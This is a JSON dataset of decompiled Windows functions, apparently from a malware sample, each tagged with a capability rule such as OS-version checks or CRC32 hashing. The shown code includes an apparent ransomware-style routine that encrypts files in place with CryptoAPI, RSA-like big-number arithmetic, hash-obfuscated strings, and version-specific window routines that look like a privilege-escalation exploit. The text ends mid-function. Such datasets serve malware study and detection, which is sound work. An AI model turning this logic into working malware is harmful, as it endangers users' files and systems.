{
    "00401175": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nint32_t fcn.00401175(char *param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char *pcVar2;\n    \n    iVar1 = in_EAX;\n    pcVar2 = param_1;\n    while (iVar1 != 0) {\n        if (*pcVar2 == '\\n') {\n            in_EAX = in_EAX + -1;\n            iVar1 = iVar1 + -1;\n            if (iVar1 == 0) break;\n            (*_sym.imp.ntdll.dll_memmove)(pcVar2, pcVar2 + 1, iVar1);\n        }\n        else {\n            pcVar2 = pcVar2 + 1;\n            iVar1 = iVar1 + -1;\n        }\n    }\n    param_1[in_EAX] = '\\0';\n    return in_EAX;\n}\n",
        "token_count": 186
    },
    "00402894": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00402894(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_20h;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    \n    iVar1 = *(in_EAX + 0xc);\n    if (((((iVar1 != 0x6ce10d58) && (iVar1 != -0x732afcf1)) && (iVar1 != -0x439a06cf)) &&\n        ((iVar1 != -0x327f3d7f && (iVar1 != -0x31a89e8c)))) && ((iVar1 != -0x2a25b78c && (iVar1 != -0x101042db)))) {\n        return CONCAT31(iVar1 >> 8, 1);\n    }\n    uVar3 = 0;\n    if (*0x43358b == '\\0') {\n        uStack32 = 0;\n        uStack28 = 0;\n        uStack24 = 0;\n        var_20h = 1;\n        iVar1 = (**0x4136d4)(&var_10h, &var_20h, 0);\n        *0x43358b = '\\x01' - (iVar1 != 0);\n        if (*0x43358b == '\\0') {\n            return CONCAT31(-iVar1 >> 8, 1);\n        }\n    }\n    uVar2 = (**0x4136f0)(arg_8h, &var_8h);\n    if (uVar2 == 0) {\n        iVar1 = (**0x4136f4)(var_8h, &var_ch);\n        if (((iVar1 == 0) && (9 < var_ch)) && ((iVar1 = (**0x4136f8)(var_8h, &var_10h),  iVar1 == 0 && (9 < var_10h))))\n        {\n            uVar3 = 1;\n        }\n        uVar2 = (**0x4136e0)(var_8h);\n    }\n    return uVar2 & 0xffffff00 | uVar3;\n}\n",
        "token_count": 518
    },
    "004070d7": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004070d7(uint32_t param_1)\n\n{\n    char unaff_BL;\n    int32_t iVar1;\n    \n    iVar1 = -1;\n    if ((unaff_BL - 0x30U < 10) && (unaff_BL <= param_1 + 0x2f)) {\n        iVar1 = unaff_BL - 0x30;\n    }\n    else if (10 < param_1) {\n        if ((unaff_BL + 0xbfU < 0x1a) && (unaff_BL <= param_1 + 0x36)) {\n            iVar1 = unaff_BL - 0x37;\n        }\n        if ((unaff_BL + 0x9fU < 0x1a) && (unaff_BL <= param_1 + 0x56)) {\n            iVar1 = unaff_BL - 0x57;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 209
    },
    "0040975b": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.0040975b(void)\n\n{\n    char cVar1;\n    uint in_EAX;\n    uint uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    cVar1 = fcn.0040b1a5();\n    if (9 < *0x434594) {\n        (**0x41347c)(10000);\n    }\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.0040b19f();\n        fcn.00407c1d(0x412168, 0xf, 0xbe32ff94, uVar2);\n        fcn.00402563();\n    }\n    else {\n        fcn.0040a764();\n        fcn.0040210f();\n        cVar1 = fcn.0040eb02();\n        if (cVar1 == '\\0') {\n            fcn.00407c1d(0x412178, 0x18, 0x5d99f87b);\n            fcn.00402563();\n        }\n        else {\n            cVar1 = fcn.0040f73e(in_EAX, &var_4h, &var_8h);\n            if (cVar1 == '\\0') {\n                fcn.00407c1d(0x412194, 0x19, 0xc0fe9edd);\n                fcn.00402563();\n                fcn.0040a764();\n            }\n            else {\n                fcn.00401d88(in_EAX);\n                fcn.0040f50f();\n                fcn.0040b5c1(in_EAX);\n                if (*0x43359a != '\\0') {\n                    cVar1 = fcn.0040f8b4(&var_8h, &var_4h);\n                    if (cVar1 != '\\0') {\n                        fcn.00401d88(in_EAX);\n                        fcn.0040f50f();\n                    }\n                }\n            }\n        }\n    }\n    (**0x4134a4)(*0x433620);\n    return;\n}\n",
        "token_count": 464
    },
    "null": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2",
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "0040ce19": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040ce19(void)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    char16_t *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    var_ch = 0;\n    var_1h._0_1_ = '\\0';\n    (**0x41347c)(200);\n    *0x43470c = (**0x4133b8)(0);\n    *0x434798 = 0;\n    iVar3 = fcn.0040bff8(&var_8h, &var_ch, &var_1h);\n    if (iVar3 != 0) {\n        if ((var_8h == 5) && (var_ch != 0)) {\n            *0x4139ac = 0;\n            iVar3 = *0x4139ac;\n            if (var_1h != '\\x01') {\n                *0x4139ac = 1;\n                iVar3 = *0x4139ac;\n            }\n        }\n        else {\n            iVar4 = fcn.0040bfc9(&var_8h, &var_ch);\n            iVar3 = *0x4139ac;\n            if (iVar4 != 0) {\n                if (var_8h == 6) {\n                    if (var_ch == 0) {\n                        *0x4139ac = 2;\n                        iVar3 = *0x4139ac;\n                    }\n                    else if (var_ch == 1) {\n                        *0x4139ac = 3;\n                        iVar3 = *0x4139ac;\n                    }\n                    else if (var_ch == 2) {\n                        *0x4139ac = 4;\n                        iVar3 = *0x4139ac;\n                    }\n                    else {\n                        iVar3 = 5;\n                        if (var_ch != 3) {\n                            return 0;\n                        }\n                    }\n                }\n                else {\n                    if (var_8h != 10) {\n                        return 0;\n                    }\n                    *0x4139ac = 6;\n                    iVar3 = *0x4139ac;\n                }\n            }\n        }\n        *0x4139ac = iVar3;\n        *0x4139ec = *(*0x4139ac * 4 + 0x4139d0);\n        *0x434758 = *(*0x4139ac * 4 + 0x4139f0);\n        *0x43475c = *(*0x4139ac * 4 + 0x413a0c);\n        *0x434760 = *(*0x4139ac * 4 + 0x413a28);\n        *0x434748 = fcn.0040c880();\n        *0x43474c = fcn.0040c75a();\n        if (*0x434748 == 0) {\n            return 0;\n        }\n        if (*0x43474c == 0) {\n            return 0;\n        }\n        *0x434750 = *0x43474c + -8;\n        *0x434744 = (-(*0x4139b0 != 0) & 0x18) + 0x2a;\n        *0x434754 = (-(*0x4139b0 != 0) & 0x24) + 0x34;\n    }\n    var_28h = *0x43470c;\n    var_3ch = 0x30;\n    var_38h = 0;\n    var_34h = 0x40c183;\n    var_30h = 0;\n    var_2ch = 0;\n    var_24h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = L\"MyMainWnd\";\n    var_10h = 0;\n    iVar2 = (**0x4130c8)(&var_3ch);\n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x413a48 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0);\n    *0x413a4c = (*pcVar1)(1);\n    iVar3 = (**0x413474)(0, 0, 0x40c8ee, 0, 0, 0);\n    if (iVar3 != 0) {\n        for (uVar5 = 0; ((*0x434764 == 0 && (*0x43479c < *0x413a44)) && (uVar5 < *0x413a44 * 10)); uVar5 = uVar5 + 1) {\n            (**0x41347c)(100);\n        }\n        (**0x413510)(iVar3, 0);\n        (**0x41347c)(100);\n        pcVar1 = _sym.imp.USER32.dll_keybd_event;\n        (*_sym.imp.USER32.dll_keybd_event)(0x1b, 0, 2, 0);\n        (*pcVar1)(0x12, 0, 2, 0);\n        return *0x434764;\n    }\n    return *0x434764;\n}\n",
        "token_count": 1305
    },
    "0040d9ce": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040d9ce(void)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    char16_t *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    var_ch = 0;\n    var_1h._0_1_ = '\\0';\n    (**0x41347c)(200);\n    *0x43470c = (**0x4133b8)(0);\n    *0x434818 = 0;\n    iVar3 = fcn.0040bff8(&var_8h, &var_ch, &var_1h);\n    if (iVar3 != 0) {\n        if ((var_8h == 5) && (var_ch != 0)) {\n            *0x4138c4 = 0;\n            iVar3 = *0x4138c4;\n            if (var_1h != '\\x01') {\n                *0x4138c4 = 2;\n                iVar3 = *0x4138c4;\n            }\n        }\n        else {\n            iVar4 = fcn.0040bfc9(&var_8h, &var_ch);\n            iVar3 = *0x4138c4;\n            if (iVar4 != 0) {\n                if (var_8h == 6) {\n                    if (var_ch == 0) {\n                        *0x4138c4 = 4;\n                        iVar3 = *0x4138c4;\n                    }\n                    else {\n                        iVar3 = 6;\n                        if (var_ch != 1) {\n                            if (var_ch == 2) {\n                                *0x4138c4 = 8;\n                                iVar3 = *0x4138c4;\n                            }\n                            else {\n                                if (var_ch != 3) {\n                                    return 0;\n                                }\n                                *0x4138c4 = 10;\n                                iVar3 = *0x4138c4;\n                            }\n                        }\n                    }\n                }\n                else {\n                    if (var_8h != 10) {\n                        return 0;\n                    }\n                    *0x4138c4 = 0xc;\n                    iVar3 = *0x4138c4;\n                }\n            }\n        }\n        *0x4138c4 = iVar3;\n        *0x4347d8 = *(*0x4138c4 * 4 + 0x4138c8);\n        *0x4347e8 = str._h_h_h[*0x4138c4];\n        *0x4347ec = str._h_h_h[*0x4138c4 + 0xe];\n        *0x4347f0 = *(*0x4138c4 * 4 + 0x413970);\n        *0x4347d8 = fcn.0040d59f();\n        *0x4347dc = fcn.0040d479();\n        if (*0x4347d8 == 0) {\n            return 0;\n        }\n        if (*0x4347dc == 0) {\n            return 0;\n        }\n        if ((*0x4138c4 == 0xc) && (iVar3 = (**0x4133b8)(\"win32u.dll\"),  iVar3 != 0)) {\n            *0x4347e8 = *0x4347e8 + L'\\b';\n        }\n        else if ((*0x4138c4 == 0xd) && (iVar3 = (**0x4133b8)(\"win32u.dll\"),  iVar3 != 0)) {\n            *0x4347e8 = *0x4347e8 + L'\\xfffffffc';\n        }\n        *0x4347e0 = *0x4347dc + -4;\n        *0x4347d4 = (-(*0x4347d0 != 0) & 0x18) + 0x2a;\n        *0x4347e4 = (-(*0x4347d0 != 0) & 0x24) + 0x34;\n    }\n    var_28h = *0x43470c;\n    var_3ch = 0x30;\n    var_38h = 0;\n    var_34h = 0x40c183;\n    var_30h = 0;\n    var_2ch = 0;\n    var_24h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = L\"MyMainWnd\";\n    var_10h = 0;\n    iVar2 = (**0x4130c8)(&var_3ch);\n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x413a48 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0);\n    *0x413a4c = (*pcVar1)(1);\n    iVar3 = (**0x413474)(0, 0, fcn.0040d60d, 0, 0, 0);\n    if (iVar3 != 0) {\n        for (uVar5 = 0; ((*0x434814 == 0 && (*0x43481c < *0x4139a8)) && (uVar5 < *0x4139a8 * 10)); uVar5 = uVar5 + 1) {\n            (**0x41347c)(100);\n        }\n        (**0x413510)(iVar3, 0);\n        (**0x41347c)(100);\n        pcVar1 = _sym.imp.USER32.dll_keybd_event;\n        (*_sym.imp.USER32.dll_keybd_event)(0x1b, 0, 2, 0);\n        (*pcVar1)(0x12, 0, 2, 0);\n        return *0x434814;\n    }\n    return *0x434814;\n}\n",
        "token_count": 1465
    },
    "004012b6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl\nfcn.004012b6(uint arg_8h, uint s2, uint32_t arg_10h, uint arg_14h, int32_t arg_18h, uint32_t arg_1ch, int32_t arg_20h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t arg_10h_00;\n    bool bVar5;\n    uint var_38h;\n    uint var_34h;\n    uint32_t var_30h;\n    uint s1;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    puVar1 = fcn.0040fdf1();\n    if (puVar1 != NULL) {\n        var_30h = *0x433598;\n        var_38h = 0x208;\n        var_34h = 0x6801;\n        sub.ntdll.dll_memcpy(&s1, s2, var_30h);\n        iVar2 = (**0x4137d8)(puVar1, &var_38h, 0x1c, 0, 0, &var_14h);\n        if (iVar2 != 0) {\n            var_10h = 0;\n            var_ch = 0;\n            var_1h._0_1_ = 1;\n            var_8h = 0;\n            uVar4 = arg_10h;\n            while (uVar4 != 0) {\n                var_8h = var_8h + 1;\n                arg_10h_00 = *0x4335c4;\n                if (uVar4 < *0x4335c4) {\n                    arg_10h_00 = uVar4;\n                }\n                uVar4 = uVar4 - arg_10h_00;\n                (**0x4134c0)(arg_8h, arg_1ch, arg_20h, 0, 0);\n                (**0x413440)(arg_8h, arg_14h, arg_10h_00, &var_1ch, 0);\n                fcn.0040fc7e(&var_10h, &var_ch, arg_10h_00);\n                var_18h = arg_10h_00;\n                iVar2 = (**0x4137d4)(var_14h, 0, uVar4 == 0, 0, arg_14h, &var_18h, arg_10h_00);\n                if (iVar2 == 0) {\n                    var_1h._0_1_ = 0;\n                    break;\n                }\n                (**0x4134c0)(arg_8h, arg_1ch, arg_20h, 0, 0);\n                (**0x413498)(arg_8h, arg_14h, arg_10h_00, &var_1ch, 0);\n                bVar5 = CARRY4(arg_1ch, arg_10h_00);\n                arg_1ch = arg_1ch + arg_10h_00;\n                arg_20h = arg_20h + bVar5;\n                if ((var_8h & 1) == 0) {\n                    (**0x41347c)(1);\n                }\n            }\n            uVar3 = fcn.0040fd75(arg_10h);\n            *(arg_18h + 4) = uVar3;\n            (**0x4137e0)(var_14h);\n        }\n        puVar1 = &s1;\n        for (uVar4 = *0x433598; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar1 = 0;\n            puVar1 = puVar1 + 1;\n        }\n    }\n    return puVar1 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 945
    },
    "00401802": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401802(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    ushort uVar2;\n    char cVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint uVar8;\n    int32_t iStack1804;\n    uint *puStack1800;\n    uint uStack1796;\n    int32_t iStack1792;\n    int32_t iStack1788;\n    uint uStack1784;\n    uint uStack1780;\n    int32_t iStack1776;\n    int32_t iStack1772;\n    uchar auStack1752 [12];\n    uchar auStack1740 [4];\n    uchar auStack1736 [40];\n    uchar auStack1696 [40];\n    uchar auStack1656 [6];\n    ushort auStack1650 [4];\n    uchar auStack1642 [1114];\n    uchar auStack528 [524];\n    \n    uStack1796 = (**0x4134f8)();\n    puVar4 = fcn.00406c7f();\n    if (puVar4 != NULL) {\n        puStack1800 = puVar4;\n        iStack1788 = fcn.00406c7f();\n        if (iStack1788 != 0) {\n            iStack1792 = fcn.00406c7f();\n            if (iStack1792 != 0) {\n                *(puVar4 + 1) = 0;\n                uVar2 = *0x433598;\n                *puVar4 = 0x52627245;\n                *(puVar4 + 0x15) = uVar2;\n                while( true ) {\n                    iVar7 = (**0x4134ac)(*0x433620);\n                    if ((iVar7 == 0) || (iVar7 = fcn.004017d3(),  iVar7 == 0)) goto code_r0x00401d62;\n                    iStack1804 = fcn.0040e2b9(&iStack1776);\n                    if (iStack1804 == 0) break;\n                    iStack1772 = iStack1804 + iStack1776 * 2;\n                    (**0x413174)(auStack528, iStack1804);\n                    uVar1 = *(iVar7 + 8);\n                    cVar3 = fcn.00402699();\n                    if (cVar3 != '\\0') {\n                        uStack1784 = 0;\n                        uStack1780 = 0;\n                        iVar5 = (**0x41342c)(iStack1804, 0x80000000, 1, 0, 3, 0);\n                        if (iVar5 != -1) {\n                            (**0x413420)(iVar5, &stack0xfffff8ec);\n                            (**0x4134e8)(iVar5);\n                        }\n                        iStack1792 = *(iVar7 + 0x14);\n                        uStack1796 = *(iVar7 + 0x10);\n                        (**0x4134e0)(&uStack1796, &iStack1788);\n                        (**0x413444)(&uStack1796, &iStack1788);\n                        puVar4 = &uStack1796;\n                        uVar8 = 1;\n                        (**0x4134d0)(0x400, 1, puVar4, 0, auStack1740, 0x14);\n                        (**0x413478)(0x400, 8, &stack0xfffff8e4, 0, &iStack1804, 0x14);\n                        auStack1650[3] = 0;\n                        sub.ntdll.dll_memset(auStack1642, 0, 0x3fe);\n                        if ((uVar1 & 1) != 0) {\n                            uVar6 = fcn.00407c34(0x411d10, 2, 0x27fd94f8);\n                            (**0x413170)(auStack1650 + 3, uVar6);\n                        }\n                        if ((uVar1 & 2) != 0) {\n                            uVar6 = fcn.00407c34(0x411d14, 2, 0x90cd6312);\n                            (**0x413170)(auStack1650 + 3, uVar6);\n                        }\n                        if ((uVar1 & 4) != 0) {\n                            uVar6 = fcn.00407c34(0x411d18, 2, 0xfdb28628);\n                            (**0x413170)(auStack1650 + 3, uVar6);\n                        }\n                        if ((uVar1 & 0x10) != 0) {\n                            uVar6 = fcn.00407c34(0x411d1c, 2, 0x40ea4ec7);\n                            (**0x413170)(auStack1650 + 3, uVar6);\n                        }\n                        if ((uVar1 & 0x20) != 0) {\n                            uVar6 = fcn.00407c34(0x411d20, 2, 0xb593dbb0);\n                            (**0x413170)(auStack1650 + 3, uVar6);\n                        }\n                        if ((uVar1 & 0x40) != 0) {\n                            uVar6 = fcn.00407c34(0x411d24, 4, 0x58c6e5ff);\n                            (**0x413170)(auStack1650 + 3, uVar6);\n                        }\n                        if (uVar1 < '\\0') {\n                            uVar6 = fcn.00407c34(0x411d2c, 2, 0x39a478df);\n                            (**0x413170)(auStack1650 + 3, uVar6);\n                        }\n                        if ((uVar1 & 0x100) != 0) {\n                            uVar6 = fcn.00407c34(0x411d30, 2, 0xabc49c75);\n                            (**0x413170)(auStack1650 + 3, uVar6);\n                        }\n                        if ((uVar1 & 0x200) != 0) {\n                            uVar6 = fcn.00407c34(0x411d18, 2, 0xfdb28628);\n                            (**0x413170)(auStack1650 + 3, uVar6);\n                        }\n                        if ((uVar1 & 0x400) != 0) {\n                            uVar6 = fcn.00407c34(0x411d34, 3, 0xca332ff9);\n                            (**0x413170)(auStack1650 + 3, uVar6);\n                        }\n                        if ((uVar1 & 0x800) != 0) {\n                            uVar6 = fcn.00407c34(0x411d38, 2, 0x83982786);\n                            (**0x413170)(auStack1650 + 3, uVar6);\n                        }\n                        if ((uVar1 & 0x1000) != 0) {\n                            uVar6 = fcn.00407c34(0x411d3c, 2, 0x5478877e);\n                            (**0x413170)(auStack1650 + 3, uVar6);\n                        }\n                        if ((uVar1 & 0x2000) != 0) {\n                            uVar6 = fcn.00407c34(0x411d40, 6, 0x77571780);\n                            (**0x413170)(auStack1650 + 3, uVar6);\n                        }\n                        if ((uVar1 & 0x4000) != 0) {\n                            uVar6 = fcn.00407c34(0x411d48, 2, 0x967557de);\n                            (**0x413170)(auStack1650 + 3, uVar6);\n                        }\n                        if ((uVar1 & 0x10000) != 0) {\n                            uVar6 = fcn.00407c34(0x411d4c, 2, 0x727922bb);\n                            (**0x413170)(auStack1650 + 3, uVar6);\n                        }\n                        iVar7 = (**0x4133a4)(auStack1650 + 3);\n                        auStack1650[iVar7] = 0;\n                        (**0x413180)(uVar8, puVar4, auStack1752, 0x32);\n                        uVar8 = fcn.00407c34(0x411d50, 0x56, 0x13bb68d6, uStack1796, iStack1804, auStack1696, \n                                             auStack1736, auStack1656);\n                        fcn.004025de(*arg_8h, uVar8);\n                    }\n                    if (*0x43358a != '\\0') {\n                        if ((uVar1 & 0x2000) == 0) {\n                            (**0x4134d8)(iStack1804);\n                        }\n                        (**0x4134a0)();\n                        cVar3 = fcn.00401418(iStack1804, auStack528, iStack1772, puStack1800, iStack1788, iStack1792);\n                        if (cVar3 != '\\0') {\n                            (**0x4134a0)();\n                            uVar8 = fcn.00407c34(0x411da8, 0x29, 0x99eab87f, uStack1796, iStack1804);\n                            fcn.004025de(*arg_8h, uVar8);\n                            fcn.0040df78();\n                        }\n                    }\n                    sub.ntdll.dll_memset(puStack1800 + 0x17, 0);\n                    fcn.00406d25();\n                    fcn.00406d25();\n                }\n                fcn.00406d25();\ncode_r0x00401d62:\n                fcn.00406d6b();\n            }\n            fcn.00406d6b();\n        }\n        fcn.00406d6b();\n    }\n    return;\n}\n",
        "token_count": 2263
    },
    "00404886": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.00404886(void)\n\n{\n    uint8_t *arg_8h;\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t arg_8h_00;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = fcn.00403bd8();\n    iVar1 = fcn.00403bd8();\n    puVar2 = fcn.00403bd8();\n    arg_8h_00 = fcn.00403bd8();\n    iVar3 = fcn.00403bd8();\n    iVar4 = fcn.00403bd8();\n    iVar5 = fcn.00404721();\n    if (iVar5 < 1) {\ncode_r0x00404a26:\n        var_1ch = 0;\n    }\n    else {\n        fcn.004045cc();\n        fcn.004043a4();\n        fcn.004043b8();\n        while ((*arg_8h & 1) == 0) {\n            fcn.004044b1(arg_8h, arg_8h, 1, unaff_ESI);\n            fcn.00404597(iVar1);\n        }\n        fcn.0040435e();\n        var_18h = 0;\n        var_1ch = 1;\n        do {\n            fcn.004043b8();\n            do {\n                uVar6 = fcn.00404ac5();\n                *puVar2 = uVar6;\n                iVar5 = fcn.0040430d(puVar2);\n            } while (-1 < iVar5);\n            fcn.004043b8();\n            fcn.00404b21(arg_8h_00, arg_8h, unaff_EBX);\n            while (((iVar5 = fcn.0040433e(iVar4),  iVar5 == 0 || (iVar5 = fcn.00404721(),  iVar5 != 0)) &&\n                   (iVar5 = fcn.0040430d(arg_8h_00),  iVar5 != 0))) {\n                iVar5 = fcn.0040433e(iVar4);\n                if ((iVar5 == 0) && (iVar5 = fcn.00404721(),  iVar5 == 0)) goto code_r0x00404a26;\n                fcn.00404597(iVar4);\n                iVar5 = fcn.0040430d(iVar4);\n                if (iVar5 < 0) {\n                    fcn.00404833(arg_8h_00, arg_8h_00, arg_8h_00, unaff_EBX);\n                }\n                iVar5 = fcn.0040430d(iVar4);\n                if (-1 < iVar5) goto code_r0x00404a26;\n            }\n            var_18h = var_18h + 1;\n        } while (var_18h < 0x32);\n    }\n    if (arg_8h != NULL) {\n        fcn.004043b8();\n    }\n    fcn.00403bed();\n    if (iVar1 != 0) {\n        fcn.004043b8();\n    }\n    fcn.00403bed();\n    if (puVar2 != NULL) {\n        fcn.004043b8();\n    }\n    fcn.00403bed();\n    if (arg_8h_00 != 0) {\n        fcn.004043b8();\n    }\n    fcn.00403bed();\n    if (iVar3 != 0) {\n        fcn.004043b8();\n    }\n    fcn.00403bed();\n    if (iVar4 != 0) {\n        fcn.004043b8();\n    }\n    fcn.00403bed();\n    return var_1ch;\n}\n",
        "token_count": 925
    },
    "00404b21": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_238h\n\nuint __cdecl fcn.00404b21(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    uint in_ECX;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    ulong uVar8;\n    uint var_238h;\n    uint var_234h;\n    uint var_230h;\n    uint32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint32_t *var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = fcn.00404372();\n    if (uVar1 == 0) {\n        fcn.004043d4();\n        uVar2 = 1;\n    }\n    else if (uVar1 == 1) {\n        fcn.004047bd(arg_8h, in_ECX, arg_10h);\n        uVar2 = 1;\n    }\n    else {\n        var_1ch = NULL;\n        do {\n            if ((0x1f < var_1ch) || (puVar4 = var_1ch * 4 + 0x413a64,  uVar1 <= *puVar4 && *puVar4 != uVar1)) break;\n            var_1ch = var_1ch + 1;\n        } while (var_1ch < 0x8);\n        if (var_1ch < 0x2) {\n            uVar2 = fcn.00404b26(arg_8h, in_ECX, arg_ch, arg_10h);\n        }\n        else {\n            var_8h = in_EAX * 2;\n            var_4h = fcn.00403bd8();\n            var_18h = fcn.00403bd8();\n            var_28h = fcn.00403bd8();\n            var_ch = fcn.00403bd8();\n            fcn.00404833(var_28h, in_ECX, in_ECX, arg_10h);\n            uVar1 = 1;\n            var_30h = var_1ch + -1;\n            var_34h = 1 << (var_30h & 0x1f);\n            if (1 < var_34h) {\n                do {\n                    uVar2 = fcn.00403bd8();\n                    (&var_234h)[uVar1] = uVar2;\n                    fcn.004043a4();\n                    fcn.00403e49(var_28h, in_EAX);\n                    fcn.00403f7c(var_18h, var_4h, var_8h, arg_10h, in_EAX);\n                    uVar1 = uVar1 + 1;\n                } while (uVar1 < var_34h);\n            }\n            var_2ch = 1;\n            uVar8 = fcn.0040435e(arg_ch);\n            var_20h = uVar8;\n            puVar4 = (uVar8 >> 0x20) + -4 + var_20h * 4;\n            var_14h = 0x80000000;\n            do {\n                if ((var_14h & *puVar4) != 0) break;\n                var_14h = var_14h >> 1;\n            } while (var_14h != 0);\n            uVar1 = 0;\n            var_10h = 0;\n            var_24h = 0;\n            if (var_20h != 0) {\n                var_1ch = puVar4;\n                do {\n                    if (var_2ch == 0) {\n                        fcn.004041a4(var_4h, var_ch, in_EAX);\n                        fcn.00403f7c(var_18h, var_4h, var_8h, arg_10h, in_EAX);\n                    }\n                    if (var_24h == 0) {\n                        if ((*var_1ch & var_14h) != 0) {\n                            uVar1 = 1;\n                            var_24h = 1;\n                            iVar6 = var_20h;\n                            puVar4 = var_1ch;\n                            uVar3 = var_14h;\n                            for (iVar5 = var_30h; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                if (uVar3 == 1) {\n                                    iVar6 = iVar6 + -1;\n                                    uVar3 = 0x80000000;\n                                    puVar4 = puVar4 + -1;\n                                }\n                                else {\n                                    uVar3 = uVar3 >> 1;\n                                }\n                                uVar1 = uVar1 * 2;\n                                if ((iVar6 != 0) && ((*puVar4 & uVar3) != 0)) {\n                                    uVar1 = uVar1 | 1;\n                                }\n                            }\n                            var_10h = var_30h;\n                            for (; (var_10h != 0 && ((uVar1 & 1) == 0)); uVar1 = uVar1 >> 1) {\n                                var_10h = var_10h + -1;\n                            }\n                            uVar1 = uVar1 >> 1;\n                            goto code_r0x00404e72;\n                        }\n                    }\n                    else {\n                        if (var_10h != 0) {\n                            var_10h = var_10h + -1;\n                        }\ncode_r0x00404e72:\n                        if (var_10h == 0) {\n                            if (var_2ch == 0) {\n                                fcn.00403e49((&var_234h)[uVar1], in_EAX);\n                                fcn.00403f7c(var_18h, var_4h, var_8h, arg_10h, in_EAX);\n                            }\n                            else {\n                                fcn.004043a4();\n                                var_2ch = 0;\n                            }\n                            var_24h = 0;\n                            var_10h = 0;\n                        }\n                    }\n                    if (var_14h == 1) {\n                        var_20h = var_20h + -1;\n                        var_1ch = var_1ch + -1;\n                        var_14h = 0x80000000;\n                    }\n           